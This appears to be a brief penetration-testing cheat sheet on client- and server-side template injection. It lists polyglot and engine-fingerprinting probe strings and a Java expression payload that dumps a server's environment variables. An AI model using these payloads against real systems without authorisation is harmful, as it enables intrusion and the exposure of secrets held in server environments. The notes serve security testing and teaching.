# Template Injection
## Client Side (XSS)
**Try looking for Debug panel**
### Quick Checks
`${{<%[%'"}}%\`

## Server Side
** Enumerate Templating Engine by sending invalid input **
### Quick Checks
`{{blah}}`
`${blah}`
`<%= blah %>`

![](TemplateInjectionServer.png)

### Checking Environment
Java - `${T(java.lang.System).getenv()}`